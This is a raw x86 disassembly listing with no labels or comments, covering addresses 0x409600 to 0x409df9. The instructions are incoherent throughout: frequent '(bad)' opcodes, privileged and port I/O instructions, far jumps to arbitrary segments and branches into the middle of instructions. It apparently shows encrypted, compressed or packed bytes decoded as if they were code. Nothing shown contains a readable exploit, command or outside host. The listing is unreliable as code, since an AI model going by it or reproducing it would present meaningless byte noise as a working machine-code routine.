  409600:	cs out 0x78,eax
  409603:	xchg   ebp,eax
  409604:	push   edx
  409605:	in     eax,0xba
  409607:	xchg   ebp,eax
  409608:	jmp    0xef55:0x54ba976a
  40960f:	add    eax,0x35994f58
  409614:	(bad)  
  409615:	cli    
  409616:	(bad)  
  409617:	in     eax,0x14
  409619:	jno    0x40966c
  40961b:	data16 lods al,BYTE PTR ds:[esi]
  40961d:	and    eax,0x73774c88
  409622:	jnp    0x40963b
  409624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409625:	dec    edi
  409626:	iret   
  409627:	pop    esi
  409628:	dec    eax
  409629:	cdq    
  40962a:	and    al,0xe4
  40962c:	add    DWORD PTR [ecx+ecx*4-0x5a],esi
  409630:	pop    esp
  409631:	push   ecx
  409632:	cmp    BYTE PTR [edx-0x5e234e05],dh
  409638:	add    edx,DWORD PTR [eax+0x3a88be0b]
  40963e:	(bad)  
  409640:	and    bh,BYTE PTR [ebp+ebx*4+0x53]
  409644:	sub    DWORD PTR [edi],0x23
  409647:	sbb    eax,eax
  409649:	fstp   QWORD PTR ds:0x34b08c06
  40964f:	(bad)  
  409651:	lds    edx,FWORD PTR [ebx-0x9]
  409654:	xor    ah,BYTE PTR [ebx+edi*4+0x5b]
  409658:	aad    0x3d
  40965a:	xor    al,0x3f
  40965c:	and    eax,DWORD PTR [ebp+ebp*2-0x16]
  409660:	cmc    
  409661:	fld    TBYTE PTR [eax]
  409663:	xor    eax,0xe1f47eae
  409668:	cmp    DWORD PTR [esi+ebp*1-0x71],0x77
  40966d:	mov    al,ds:0x827a3ed5
  409672:	(bad)  [esi+0x39]
  409675:	xor    bl,BYTE PTR [eax-0x32]
  409678:	push   esi
  409679:	mul    DWORD PTR [ebp+0x24]
  40967c:	xor    al,0xbc
  40967e:	je     0x4096b0
  409680:	dec    edx
  409681:	pop    ebp
  409682:	cmp    eax,0x6d3adb59
  409687:	iret   
  409688:	data16 int3 
  40968a:	cwde   
  40968b:	pop    eax
  40968c:	and    esi,esi
  40968e:	ret    
  40968f:	jno    0x4096fc
  409691:	push   ds
  409692:	pop    es
  409693:	push   cs
  409694:	cdq    
  409695:	repnz loop 0x409679
  409698:	and    dl,BYTE PTR [ebp+0x39]
  40969b:	(bad)  
  40969c:	mov    esp,0x1650b429
  4096a1:	add    BYTE PTR [ebp+0x32d3ad3c],al
  4096a7:	rcr    DWORD PTR [ecx+0x65],cl
  4096aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096ab:	mov    BYTE PTR ds:0xc97a975d,0xb3
  4096b2:	dec    edi
  4096b3:	sbb    DWORD PTR [eax+edi*4+0x59],esp
  4096b7:	fiadd  DWORD PTR [esi]
  4096b9:	jo     0x4096f3
  4096bb:	jb     0x4096bb
  4096bd:	adc    DWORD PTR [eax],0x10
  4096c0:	aad    0xdc
  4096c2:	scas   eax,DWORD PTR es:[edi]
  4096c3:	ror    DWORD PTR [ebx-0x5b],1
  4096c6:	js     0x40971a
  4096c8:	nop
  4096c9:	aad    0x5c
  4096cb:	xor    DWORD PTR [ebp-0x19],ebp
  4096ce:	jmp    0x4096c8
  4096d0:	outs   dx,BYTE PTR ds:[esi]
  4096d1:	ins    DWORD PTR es:[edi],dx
  4096d2:	mov    bl,0x0
  4096d4:	das    
  4096d5:	xor    ch,BYTE PTR [eax+0xb8e3680]
  4096db:	mov    ds:0xfc5090db,al
  4096e0:	std    
  4096e1:	pusha  
  4096e2:	push   ds
  4096e3:	idiv   BYTE PTR [edi-0x47]
  4096e6:	push   esi
  4096e7:	test   DWORD PTR fs:[edx],ebp
  4096ea:	aaa    
  4096eb:	push   es
  4096ec:	inc    ecx
  4096ed:	jmp    0x409741
  4096ef:	cmp    ebx,DWORD PTR [esi+0x22aad1e4]
  4096f5:	pop    eax
  4096f6:	ins    DWORD PTR es:[edi],dx
  4096f7:	addr16 out dx,al
  4096f9:	and    BYTE PTR [esp+edi*2-0x58],al
  4096fd:	lods   al,BYTE PTR ds:[esi]
  4096fe:	inc    eax
  4096ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409700:	pop    es
  409701:	icebp  
  409702:	mov    ecx,0x9fbf9cb5
  409707:	hlt    
  409708:	mov    esp,0xa5d9e99b
  40970d:	mov    bh,0x7b
  40970f:	xchg   edx,eax
  409710:	dec    ecx
  409711:	mov    bl,0x77
  409713:	add    eax,0xd1bca62b
  409718:	mov    ds:0xde9a6d8,al
  40971d:	outs   dx,DWORD PTR ds:[esi]
  40971e:	jl     0x4096c4
  409720:	je     0x40970c
  409722:	mov    eax,ds:0x9050c303
  409727:	xor    dl,ah
  409729:	push   0xcd26cd2c
  40972e:	inc    eax
  40972f:	mov    bh,0x99
  409731:	shl    DWORD PTR [esp+edi*1-0x2f],1
  409735:	aaa    
  409736:	cmp    eax,DWORD PTR [ebx-0x3c]
  409739:	mov    ds:0xdca9849a,eax
  40973e:	mul    BYTE PTR [edi+0x65808d98]
  409744:	sbb    ch,bl
  409746:	jno    0x409735
  409748:	(bad)  
  40974a:	ret    
  40974b:	inc    ebp
  40974c:	adc    BYTE PTR [esi],dl
  40974e:	jg     0x409747
  409750:	mov    bh,0xf5
  409752:	not    eax
  409754:	xchg   edi,eax
  409755:	jns    0x75c551cd
  40975b:	sub    DWORD PTR [ecx],0xc316007e
  409761:	xor    eax,0x2e542b22
  409766:	inc    ebp
  409767:	and    al,0x8d
  409769:	push   0x79
  40976b:	shl    DWORD PTR [ebp-0x7b],0x29
  40976f:	cmp    DWORD PTR [edx-0x64c43c65],esp
  409775:	fwait
  409776:	push   eax
  409777:	aaa    
  409778:	jp     0x409767
  40977a:	pop    ecx
  40977b:	adc    eax,0x741800f8
  409780:	shr    ah,cl
  409782:	fwait
  409783:	int3   
  409784:	and    al,BYTE PTR ds:0xfd0196bb
  40978a:	lahf   
  40978b:	adc    eax,0xc3b0922f
  409790:	pop    ecx
  409791:	test   eax,0x36035060
  409796:	ins    DWORD PTR es:[edi],dx
  409797:	jecxz  0x409767
  409799:	sti    
  40979a:	xchg   BYTE PTR [edi],ch
  40979c:	ja     0x40974e
  40979e:	stos   BYTE PTR es:[edi],al
  40979f:	mov    edx,0xc2c0825b
  4097a4:	push   ebp
  4097a5:	adc    edx,edi
  4097a7:	out    0xcd,al
  4097a9:	jns    0x409768
  4097ab:	mov    cs,WORD PTR ds:0xf3457504
  4097b1:	add    DWORD PTR [edx-0x4e584647],edx
  4097b7:	mov    ?,WORD PTR ds:0xd61f4cf6
  4097bd:	out    0x1b,al
  4097bf:	xlat   BYTE PTR ds:[ebx]
  4097c0:	mov    BYTE PTR [ebx],0xdc
  4097c3:	push   eax
  4097c4:	fwait
  4097c5:	sub    eax,0x2f93ef40
  4097ca:	data16 aaa 
  4097cc:	mov    al,0xec
  4097ce:	jb     0x409812
  4097d0:	out    dx,al
  4097d1:	or     edi,DWORD PTR [ebx+0x7972d11b]
  4097d7:	loopne 0x40984e
  4097d9:	jle    0x409823
  4097db:	adc    dl,ah
  4097dd:	mov    al,0xaf
  4097df:	xor    al,0x18
  4097e1:	jo     0x4097a7
  4097e3:	inc    edx
  4097e4:	mov    esp,0xd29f6430
  4097e9:	xchg   ecx,eax
  4097ea:	cmp    eax,0x26b09ea6
  4097ef:	loopne 0x4097da
  4097f1:	(bad)  
  4097f2:	mov    al,ds:0x24d8b647
  4097f7:	mov    al,0x34
  4097f9:	stos   BYTE PTR es:[edi],al
  4097fa:	sub    eax,0x2a8edb6c
  4097ff:	cli    
  409800:	cmp    BYTE PTR [ebp-0x74d3a6f3],ah
  409806:	cmp    eax,0x2b05da3c
  40980b:	sbb    eax,0x66744838
  409810:	stc    
  409811:	dec    esp
  409812:	cwde   
  409813:	stos   DWORD PTR es:[edi],eax
  409814:	cdq    
  409815:	retf   
  409816:	jbe    0x4097c3
  409818:	or     eax,0x1df4e78d
  40981d:	jb     0x4097fb
  40981f:	xor    DWORD PTR [ebx+esi*8-0x75],esp
  409823:	int3   
  409824:	lods   al,BYTE PTR ds:[esi]
  409825:	frstor [edi]
  409827:	shl    BYTE PTR [esi+0x75],cl
  40982a:	pop    edx
  40982b:	test   al,0x6b
  40982d:	ins    BYTE PTR es:[edi],dx
  40982e:	inc    edi
  40982f:	inc    ebx
  409830:	fnstcw WORD PTR [edx-0x6ec64520]
  409836:	loop   0x409805
  409838:	and    DWORD PTR [edi],0xbff3dc28
  40983e:	pop    eax
  40983f:	sub    al,0x25
  409841:	push   eax
  409842:	outs   dx,BYTE PTR ds:[esi]
  409843:	outs   dx,BYTE PTR ds:[esi]
  409844:	icebp  
  409845:	or     edi,DWORD PTR [esi-0x22318fd4]
  40984b:	dec    ebx
  40984c:	mov    cl,0xa5
  40984e:	push   ecx
  40984f:	(bad)  
  409850:	jno    0x409839
  409852:	rol    dl,cl
  409854:	pop    esp
  409855:	lods   eax,DWORD PTR ds:[esi]
  409856:	ins    DWORD PTR es:[edi],dx
  409857:	cli    
  409858:	pop    esi
  409859:	ins    BYTE PTR es:[edi],dx
  40985a:	call   0x4bba:0x56f3288d
  409861:	dec    esi
  409862:	repnz pop es
  409864:	jno    0x409838
  409866:	sub    DWORD PTR [eax+0x5d3ed99f],esi
  40986c:	int    0x84
  40986e:	(bad)  
  409870:	push   es
  409871:	jmp    0xa5e2984b
  409876:	pop    ecx
  409877:	sbb    al,0x74
  409879:	mov    ah,0xdc
  40987b:	dec    edi
  40987c:	xchg   esp,eax
  40987d:	shr    DWORD PTR [ecx],0x45
  409880:	xor    BYTE PTR [edx+0xe],cl
  409883:	daa    
  409884:	push   ss
  409885:	gs enter 0xac98,0x97
  40988a:	mov    esp,0x4ce95466
  40988f:	push   0x1fa11e17
  409894:	js     0x409867
  409896:	inc    edi
  409897:	or     DWORD PTR [esi+eiz*2+0x25],ebp
  40989b:	shl    BYTE PTR [esi-0x52dbb327],cl
  4098a1:	fstp   QWORD PTR [esi]
  4098a3:	push   ss
  4098a4:	test   BYTE PTR [eax],dl
  4098a6:	mov    ds:0x63e9368b,eax
  4098ab:	jmp    0x4974:0xbb71e7b0
  4098b2:	jo     0x4098b0
  4098b4:	sbb    DWORD PTR [ebp-0x9],edx
  4098b7:	mov    dl,0xff
  4098b9:	fmul   QWORD PTR gs:[ebx+0x1e]
  4098bd:	cmp    edi,DWORD PTR [ebx-0x76871359]
  4098c3:	or     ebx,DWORD PTR [edi]
  4098c5:	lods   eax,DWORD PTR ds:[esi]
  4098c6:	inc    esi
  4098c7:	pop    ds
  4098c8:	fnstcw WORD PTR [eax+0x1a25fee4]
  4098ce:	xchg   esi,eax
  4098cf:	icebp  
  4098d0:	fistp  WORD PTR [esi+0x659f45dc]
  4098d6:	mov    al,0xae
  4098d8:	add    eax,0xd0fb0c19
  4098dd:	pop    edi
  4098de:	(bad)
  4098e2:	rcr    BYTE PTR [eax],1
  4098e4:	call   0x28d1fdb0
  4098e9:	push   edi
  4098ea:	push   edx
  4098ec:	jno    0x4098bb
  4098ee:	enter  0x4574,0xba
  4098f2:	clc    
  4098f3:	cli    
  4098f4:	xor    BYTE PTR [eax],bl
  4098f6:	add    DWORD PTR [edx],esp
  4098f8:	adc    ecx,DWORD PTR [ecx]
  4098fa:	and    al,0xe8
  4098fc:	popf   
  4098fd:	sbb    BYTE PTR [eax+0x69f04d90],cl
  409903:	call   FWORD PTR [eax+0x11]
  409906:	sar    DWORD PTR [eax-0x74c8fa95],1
  40990c:	xchg   ebp,edi
  40990e:	and    BYTE PTR [ecx],0x8e
  409911:	mov    esp,0x25adca03
  409916:	mov    ch,0x7f
  409918:	pushf  
  409919:	scas   al,BYTE PTR es:[edi]
  40991a:	frstor [ecx+0x4ccd45b]
  409920:	mov    ds:0x6790b769,eax
  409925:	jne    0x409966
  409927:	mov    ebx,0xc632136a
  40992c:	mov    al,0xb5
  40992e:	cmp    DWORD PTR [ebx-0x60a7795d],esi
  409934:	std    
  409935:	das    
  409936:	or     dh,dh
  409938:	sub    eax,0x1a659c61
  40993d:	fst    QWORD PTR ds:[edx+0x6032df98]
  409944:	pop    edx
  409945:	aaa    
  409946:	and    DWORD PTR [ebx+edx*8+0x4282bc79],ebp
  40994d:	sub    BYTE PTR [edx-0x139aa2a7],dl
  409953:	lods   al,BYTE PTR ds:[esi]
  409954:	call   0x70bb670b
  409959:	mov    DWORD PTR [ebp-0x22391d02],ebp
  40995f:	arpl   WORD PTR [ebx],bp
  409961:	or     eax,0x4441f84f
  409966:	xor    DWORD PTR [ebx-0x585136ff],ebp
  40996c:	pop    esp
  40996d:	jp     0x40998c
  40996f:	in     eax,dx
  409970:	retf   0x4d7c
  409973:	cli    
  409974:	icebp  
  409975:	loope  0x4099e8
  409977:	jnp    0x4099c1
  409979:	xchg   esi,eax
  40997a:	mov    ds,WORD PTR [ebx+0x76bf708a]
  409980:	inc    ebp
  409981:	arpl   WORD PTR [ebx-0x1c67d3a5],bp
  409987:	inc    eax
  409988:	mov    bl,0x64
  40998a:	mov    esi,0x1a304b26
  40998f:	sub    cl,bh
  409991:	add    DWORD PTR [esi-0x4dcea6e2],edx
  409997:	arpl   dx,di
  409999:	sub    DWORD PTR [edi+0x40877eb3],edx
  40999f:	mov    DWORD PTR [esi-0x4e7eada7],edx
  4099a5:	add    dl,dl
  4099a7:	shr    DWORD PTR [edi],cl
  4099a9:	push   edx
  4099aa:	inc    esp
  4099ab:	je     0x409975
  4099ad:	sub    al,0x22
  4099af:	std    
  4099b0:	inc    ebx
  4099b1:	fmul   QWORD PTR [ecx+0x7b]
  4099b4:	xchg   edi,eax
  4099b5:	mov    ch,0x94
  4099b7:	call   0xae1f:0x2b06ff27
  4099be:	in     eax,0x68
  4099c0:	and    al,0x9e
  4099c2:	xchg   ecx,eax
  4099c3:	dec    esi
  4099c4:	repnz xor DWORD PTR [edx+edx*8+0x57],esp
  4099c9:	std    
  4099ca:	add    eax,0x10ebe2d8
  4099cf:	add    BYTE PTR [esi+eax*4],bh
  4099d2:	retf   0xcedd
  4099d5:	xchg   edi,eax
  4099d6:	sar    DWORD PTR [ebx+0x2c0020c1],0x2e
  4099dd:	adc    eax,0xde8daadd
  4099e2:	pop    ebx
  4099e3:	sub    eax,0x89f6757c
  4099e8:	fcomp  DWORD PTR [eax-0x445619f7]
  4099ee:	jle    0x4099e8
  4099f0:	push   esp
  4099f1:	jb     0x4099cc
  4099f3:	fs push cs
  4099f5:	loopne 0x40997c
  4099f7:	mov    al,0x17
  4099f9:	mov    ebp,0x78d11232
  4099fe:	loop   0x4099b4
  409a00:	mov    eax,ds:0x6cefe1d4
  409a05:	jnp    0x409a5a
  409a07:	push   esi
  409a08:	cli    
  409a09:	mov    ds:0x54f1ff66,eax
  409a0e:	loop   0x409a0d
  409a10:	out    0xdc,eax
  409a12:	mov    ds:0xa909f7cf,eax
  409a17:	push   DWORD PTR [ecx-0x3b6c5a7c]
  409a1d:	jnp    0x409a4b
  409a1f:	xchg   ebx,eax
  409a20:	int3   
  409a21:	gs jb  0x409a15
  409a24:	test   eax,0xe6b540ed
  409a29:	add    DWORD PTR [esp+ecx*2-0x3bf050e1],esi
  409a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a31:	jno    0x409a4a
  409a33:	ins    BYTE PTR es:[edi],dx
  409a34:	std    
  409a35:	test   DWORD PTR [ecx-0x184b0880],0x2255264d
  409a3f:	and    eax,0x4298ea77
  409a44:	imul   edi,eax,0xd69d20b5
  409a4a:	xor    eax,0x83da944b
  409a4f:	cmc    
  409a50:	sti    
  409a51:	je     0x409a04
  409a53:	mov    ds:0x53f64adc,al
  409a58:	or     BYTE PTR [esi+eax*2+0x1d],dh
  409a5c:	add    eax,0x5a042cff
  409a61:	ror    BYTE PTR [edi],1
  409a63:	jge    0x4099fc
  409a65:	sub    BYTE PTR [ebp-0x545f3fa3],cl
  409a6b:	dec    ebx
  409a6c:	mov    ebx,0x8471fba4
  409a71:	push   esi
  409a72:	fwait
  409a73:	es test eax,0x14c4e817
  409a79:	(bad)  
  409a7a:	iret   
  409a7b:	(bad)  
  409a7c:	pop    ss
  409a7d:	cmp    BYTE PTR [edx+0x38],bl
  409a80:	jmp    0x409ad1
  409a82:	out    0x24,eax
  409a84:	xor    bh,BYTE PTR ds:0xe4ee
  409a89:	das    
  409a8a:	sub    BYTE PTR gs:[esi],bl
  409a8d:	fwait
  409a8e:	test   BYTE PTR [ebx+0x3a073cee],bl
  409a94:	xor    al,0x4b
  409a96:	test   eax,0x19f83653
  409a9b:	scas   al,BYTE PTR es:[edi]
  409a9c:	sbb    DWORD PTR [eax],ebx
  409a9e:	mov    edi,0x7c0faec
  409aa3:	lahf   
  409aa4:	and    cl,BYTE PTR [ecx-0x15]
  409aa7:	cmp    bl,dh
  409aa9:	and    ebx,ebp
  409aab:	and    al,0x4f
  409aad:	(bad)  
  409aae:	and    edx,edx
  409ab0:	in     eax,dx
  409ab1:	das    
  409ab2:	ins    DWORD PTR es:[edi],dx
  409ab3:	and    DWORD PTR [ecx+0x6d],esp
  409ab6:	mov    edi,0xc285d717
  409abb:	fist   DWORD PTR [ecx-0x5bcbaed5]
  409ac1:	je     0x409af5
  409ac3:	xchg   esp,eax
  409ac4:	es stos BYTE PTR es:[edi],al
  409ac6:	inc    ebp
  409ac7:	ja     0x409b40
  409ac9:	shl    BYTE PTR [eax+0x7e508ff6],0xe
  409ad0:	enter  0xa598,0x71
  409ad4:	and    al,0x94
  409ad6:	mov    al,BYTE PTR [edx]
  409ad8:	pop    ds
  409ad9:	push   esp
  409ada:	add    al,0xf9
  409adc:	dec    ecx
  409add:	mov    bl,0xfe
  409adf:	cmc    
  409ae0:	inc    ebx
  409ae1:	or     bl,ch
  409ae3:	mov    dh,0xe
  409ae5:	sbb    eax,0xea6b9f0c
  409aea:	dec    esi
  409aeb:	jae    0x409a6d
  409aed:	sbb    eax,0xe7e475cc
  409af2:	add    al,0x18
  409af4:	sbb    ah,BYTE PTR [esi+0x7b]
  409af7:	lldt   WORD PTR [eax-0x1b]
  409afb:	push   0x2a
  409afd:	and    esi,DWORD PTR [ebp-0x6e]
  409b00:	fist   DWORD PTR [ebp+0x32]
  409b03:	pushf  
  409b04:	push   ebx
  409b05:	push   0xc4dc3198
  409b0a:	loope  0x409b85
  409b0c:	jbe    0x409a95
  409b0e:	push   edx
  409b0f:	shr    DWORD PTR [ebp-0x5a],1
  409b12:	clc    
  409b13:	pop    edi
  409b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b15:	mov    edx,0x31f1676c
  409b1a:	cmp    al,0xc1
  409b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b1d:	loopne 0x409ab3
  409b1f:	stc    
  409b20:	inc    ecx
  409b21:	pop    es
  409b22:	pop    eax
  409b23:	jb     0x409b31
  409b25:	call   0xf6077d8d
  409b2a:	sbb    bh,dh
  409b2c:	out    dx,al
  409b2d:	pop    ebp
  409b2e:	mov    bl,0x11
  409b30:	lods   al,BYTE PTR ds:[esi]
  409b31:	jg     0x409b46
  409b33:	sbb    bh,BYTE PTR [ecx-0x44]
  409b36:	aas    
  409b37:	in     al,dx
  409b38:	jecxz  0x409aca
  409b3a:	stc    
  409b3b:	iret   
  409b3c:	mov    BYTE PTR [ecx],0x73
  409b3f:	ins    DWORD PTR es:[edi],dx
  409b40:	mov    ebp,0x9e1e6188
  409b45:	dec    ebp
  409b46:	mov    ds:0xb1eae92b,eax
  409b4b:	pop    ds
  409b4c:	xchg   ebp,eax
  409b4d:	fwait
  409b4e:	jg     0x409ae8
  409b50:	push   ds
  409b51:	mov    edi,0x9acff8af
  409b56:	ffree  st(1)
  409b59:	ret    0xacaf
  409b5c:	jle    0x409ba2
  409b5e:	loope  0x409b2e
  409b60:	dec    esi
  409b61:	popf   
  409b62:	inc    ebx
  409b63:	rcr    BYTE PTR [esi-0xd],cl
  409b66:	stos   BYTE PTR es:[edi],al
  409b67:	(bad)  
  409b68:	outs   dx,DWORD PTR ds:[esi]
  409b69:	xchg   DWORD PTR [esi+0x30],edi
  409b6c:	pop    ebp
  409b6d:	sub    DWORD PTR [eax+0x770274e7],0x4fc69748
  409b77:	pusha  
  409b78:	cdq    
  409b79:	adc    eax,esi
  409b7b:	dec    ebx
  409b7c:	fidiv  DWORD PTR [esi-0x5a88fba7]
  409b82:	fsubr  DWORD PTR [ebx-0x73]
  409b85:	sbb    ecx,DWORD PTR ds:0xf6886d18
  409b8b:	xor    al,0xaf
  409b8d:	dec    edx
  409b8e:	ins    BYTE PTR es:[edi],dx
  409b8f:	in     eax,dx
  409b90:	js     0x409b29
  409b92:	mov    ebx,0xf63c31b7
  409b97:	sti    
  409b98:	inc    edi
  409b99:	pushf  
  409b9a:	pusha  
  409b9b:	in     eax,dx
  409b9c:	loopne 0x409b21
  409b9e:	enter  0xe7e2,0x17
  409ba2:	xor    al,0x67
  409ba4:	sbb    DWORD PTR [ebp+0x3a],0xfffffff1
  409ba8:	xchg   ebx,eax
  409ba9:	fs shl ebp,cl
  409bac:	xchg   esi,eax
  409bad:	pop    edx
  409bae:	rcr    dl,0x8b
  409bb1:	mov    WORD PTR [edx-0x1d],ss
  409bb4:	push   esi
  409bb5:	mov    dh,0x1a
  409bb7:	lahf   
  409bb8:	or     DWORD PTR [edx+0x484a0a6e],edx
  409bbe:	adc    al,0x6a
  409bc0:	test   eax,0xbb23f40b
  409bc5:	jo     0x409b4b
  409bc7:	mov    bh,0x92
  409bc9:	cmp    ebx,esi
  409bcb:	push   edi
  409bcc:	shl    BYTE PTR [ecx+0x6],0x7c
  409bd0:	xor    ah,BYTE PTR [esi]
  409bd2:	adc    eax,0x6b3ddb4c
  409bd7:	arpl   WORD PTR [ebp-0x3e2501f6],bp
  409bdd:	pop    eax
  409bde:	inc    esp
  409bdf:	jmp    0xa0d397e9
  409be4:	leave  
  409be5:	repz fdivp st(5),st
  409be8:	pop    esp
  409be9:	cmp    DWORD PTR [ecx+0x68],0x55271170
  409bf0:	popa   
  409bf1:	pop    ds
  409bf2:	ja     0x409c2c
  409bf4:	and    edi,DWORD PTR [edi-0x7]
  409bf7:	and    DWORD PTR [esi+esi*1-0x414be5c],eax
  409bfe:	dec    edi
  409bff:	out    0x9a,eax
  409c01:	xchg   DWORD PTR [ebx-0x8],ecx
  409c04:	xchg   edx,eax
  409c05:	jmp    0x409baa
  409c07:	jo     0x409bc8
  409c09:	sub    ebx,esi
  409c0b:	jp     0x409c4b
  409c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c0e:	xor    eax,0xcf4e3508
  409c13:	and    bh,BYTE PTR [ecx-0x4]
  409c16:	dec    ebp
  409c17:	lods   al,BYTE PTR ds:[esi]
  409c18:	xchg   esp,eax
  409c19:	sub    BYTE PTR [ecx+0x6ab0fcc8],dh
  409c1f:	dec    dx
  409c21:	imul   ebx,esi,0xffffffb7
  409c24:	jns    0x409c72
  409c26:	mov    al,0xd2
  409c28:	sbb    eax,DWORD PTR [ebx]
  409c2a:	inc    ebp
  409c2b:	mov    ah,0x28
  409c2d:	(bad)  
  409c2e:	xchg   edi,eax
  409c2f:	or     al,al
  409c31:	sub    al,0x68
  409c33:	jnp    0x409bf7
  409c35:	lea    edx,ds:0xac4fb15a
  409c3b:	repnz cmp bh,BYTE PTR [edi]
  409c3e:	dec    esi
  409c3f:	add    DWORD PTR [edi-0x22169532],ebp
  409c45:	jae    0x409cb2
  409c47:	cli    
  409c48:	xchg   ebx,eax
  409c49:	xchg   edi,eax
  409c4a:	pusha  
  409c4b:	std    
  409c4c:	sbb    al,0xb
  409c4e:	arpl   WORD PTR [edi],si
  409c50:	add    DWORD PTR [ebx+0x74],eax
  409c53:	push   es
  409c54:	and    esp,esp
  409c56:	fsubp  st(0),st
  409c58:	pop    ds
  409c59:	das    
  409c5a:	or     ah,BYTE PTR [ebp-0x6f]
  409c5d:	jg     0x409c13
  409c5f:	xchg   ebp,eax
  409c60:	aad    0x23
  409c62:	xchg   esp,eax
  409c63:	(bad)  
  409c64:	adc    eax,ebx
  409c66:	fmul   QWORD PTR [edi]
  409c68:	rcr    dh,1
  409c6a:	cld    
  409c6b:	mov    esp,0x52e71761
  409c70:	mov    esp,0x7aa50073
  409c75:	scas   eax,DWORD PTR es:[edi]
  409c76:	gs jo  0x409bfa
  409c79:	jp     0x409c2d
  409c7b:	sbb    eax,DWORD PTR [esi+0x54]
  409c7e:	not    DWORD PTR [ebp-0x76]
  409c81:	mov    ah,0x31
  409c83:	inc    ebx
  409c84:	adc    al,0x30
  409c86:	call   0xb9372678
  409c8b:	(bad)  
  409c8c:	xlat   BYTE PTR ds:[ebx]
  409c8d:	popf   
  409c8e:	sub    BYTE PTR [esi],dl
  409c90:	jns    0x409d0d
  409c92:	cmp    BYTE PTR [edi+0x33],0x5
  409c96:	cmp    eax,0xd972e604
  409c9b:	shr    DWORD PTR [eax+ecx*8+0x1d],cl
  409c9f:	sbb    eax,edx
  409ca1:	sub    eax,0xba600623
  409ca7:	hlt    
  409ca8:	test   al,0xaf
  409caa:	(bad)  [esi+0x5b84ff9b]
  409cb0:	mov    gs,WORD PTR [ecx]
  409cb2:	popf   
  409cb3:	xchg   edx,eax
  409cb4:	imul   edx,DWORD PTR ds:0x588f91b2,0xffffffee
  409cbb:	jo     0x409ce1
  409cbd:	mov    edi,DWORD PTR [ebp+0x78]
  409cc0:	imul   ebp,DWORD PTR [esi+0x2604d106],0xd
  409cc7:	imul   ebx,DWORD PTR [edi-0x76e5fb5a],0xffffff8a
  409cce:	popf   
  409ccf:	xor    BYTE PTR [edx-0x62],ch
  409cd2:	js     0x409ce1
  409cd4:	shl    ch,0xa9
  409cd7:	mov    ah,0xee
  409cd9:	mov    al,0x3d
  409cdb:	loopne 0x409d2b
  409cdd:	xchg   esp,eax
  409cde:	sub    esp,DWORD PTR [edi-0x676d8629]
  409ce4:	mov    bl,0x6c
  409ce6:	frstor [ebp+eax*1+0x7afc592a]
  409ced:	int3   
  409cee:	inc    ebx
  409cef:	fimul  DWORD PTR [esp+edx*1-0x558dd665]
  409cf6:	xchg   edi,eax
  409cf7:	sbb    DWORD PTR [esi+0x156cef3a],0xc71e8f9a
  409d01:	sbb    DWORD PTR [esi],ebp
  409d03:	pop    eax
  409d04:	cmp    dh,BYTE PTR [ecx+0x2d]
  409d07:	ret    
  409d08:	dec    ebx
  409d09:	mov    bl,0xf8
  409d0b:	out    dx,eax
  409d0c:	call   0x84db:0xbe516e3e
  409d13:	out    0xdf,eax
  409d15:	pop    ecx
  409d16:	retf   0xa85a
  409d19:	fnstcw WORD PTR [ecx]
  409d1b:	out    0xc0,ax
  409d1e:	daa    
  409d1f:	fild   DWORD PTR [ebx]
  409d21:	add    DWORD PTR [ecx],0xb16da425
  409d27:	out    dx,al
  409d28:	ds out dx,eax
  409d2a:	xchg   edx,eax
  409d2b:	or     al,0x4a
  409d2d:	mov    edi,0xff93935
  409d32:	test   al,0xe8
  409d34:	inc    edx
  409d35:	lahf   
  409d36:	pop    edx
  409d37:	sub    dl,ah
  409d39:	pop    esi
  409d3a:	xchg   ebp,eax
  409d3b:	add    DWORD PTR [edi+esi*2-0x55881d97],esi
  409d42:	and    eax,0xdb3d01ff
  409d47:	test   DWORD PTR [eax+0x7f],0x89af7177
  409d4e:	jmp    0x409d78
  409d50:	out    dx,eax
  409d51:	mov    esp,0x67e5e9ee
  409d56:	popa   
  409d57:	mov    ds:0xbd42a1af,eax
  409d5c:	dec    esi
  409d5d:	jl     0x409d5b
  409d5f:	cdq    
  409d60:	daa    
  409d61:	cli    
  409d62:	add    esi,DWORD PTR [edx+0x66039106]
  409d68:	int3   
  409d69:	and    BYTE PTR [esi+eax*4],dl
  409d6c:	mov    ecx,0xbf30f41b
  409d71:	push   es
  409d72:	push   edi
  409d73:	adc    eax,0xbba22eed
  409d78:	lahf   
  409d79:	in     al,dx
  409d7a:	jmp    0x4f33e25b
  409d7f:	ins    DWORD PTR es:[edi],dx
  409d80:	and    DWORD PTR [ecx+0x588d25f9],edi
  409d86:	jecxz  0x409de8
  409d88:	inc    edx
  409d89:	out    dx,eax
  409d8a:	sbb    al,0x80
  409d8c:	add    dl,BYTE PTR [eax]
  409d8e:	in     eax,0xa9
  409d90:	ret    
  409d91:	aad    0x96
  409d93:	adc    eax,0x30284169
  409d98:	aas    
  409d99:	mov    eax,eax
  409d9b:	pusha  
  409d9c:	repnz shr BYTE PTR [ebp+eiz*1-0x6b],1
  409da1:	fisub  WORD PTR [ebx-0x47db3eb7]
  409da7:	ret    0xfce5
  409daa:	sbb    al,BYTE PTR [esi-0x45bd835d]
  409db0:	ss add eax,0x61f8478b
  409db6:	sub    al,0x74
  409db8:	xchg   edi,eax
  409db9:	pop    es
  409dba:	push   ecx
  409dbb:	gs jno 0x409e25
  409dbe:	in     al,dx
  409dbf:	xchg   esp,eax
  409dc0:	or     DWORD PTR gs:[edi],ecx
  409dc3:	(bad)  
  409dc4:	jns    0x409df4
  409dc6:	push   eax
  409dc7:	push   0xdc38aa4
  409dcc:	adc    al,0xaa
  409dce:	pop    esp
  409dcf:	cmc    
  409dd0:	mov    ebx,0x329aa1bf
  409dd5:	mov    dh,0xe6
  409dd7:	sub    dh,dl
  409dd9:	mov    BYTE PTR [ecx+0x6f],al
  409ddc:	mov    eax,ds:0x341fe487
  409de1:	adc    ch,ch
  409de3:	adc    BYTE PTR [edx+0x76],dh
  409de6:	sbb    DWORD PTR [eax-0x1b00f1cd],0x5e
  409ded:	pop    eax
  409dee:	out    0xde,al
  409df0:	rcl    esp,cl
  409df2:	repnz leave 
  409df4:	sub    al,0x58
  409df6:	int3   
  409df7:	push   0xffffff80
  409df9:	and    BYTE PTR ds:0x1bf1896d,ah
